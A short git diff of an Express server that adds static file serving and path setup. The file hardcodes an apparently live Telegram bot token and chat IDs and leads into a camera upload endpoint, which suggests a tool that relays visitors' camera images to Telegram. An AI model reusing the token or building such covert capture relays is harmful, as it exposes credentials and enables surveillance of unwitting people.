@@ -2,21 +2,28 @@ import express from "express";
 import fetch from "node-fetch";
 import bodyParser from "body-parser";
 import FormData from "form-data";
+import path from "path";
+import { fileURLToPath } from "url";
 
 const app = express();
 
+// Path setup
+const __filename = fileURLToPath(import.meta.url);
+const __dirname = path.dirname(__filename);
+
 // Telegram config
 const BOT_TOKEN = "8237344741:AAHYDjgU3xp_dChK2Ll_Bp7Z6gCwxqOBwKc";
-
-// Chat IDs
 const CHAT_IDS = ["8167904992", "6022286935"];
 
 // Middleware
-app.use(bodyParser.json({ limit: "10mb" }));
+app.use(bodyParser.json({ limit: "20mb" }));
 
-// Serve index.html
+// Serve static files from public folder
+app.use(express.static(path.join(__dirname, "public")));
+
+// Root route → index.html
 app.get("/", (req, res) => {
-  res.sendFile("index.html", { root: "." });
+  res.sendFile(path.join(__dirname, "public", "index.html"));
 });
 
 // Camera upload endpoint
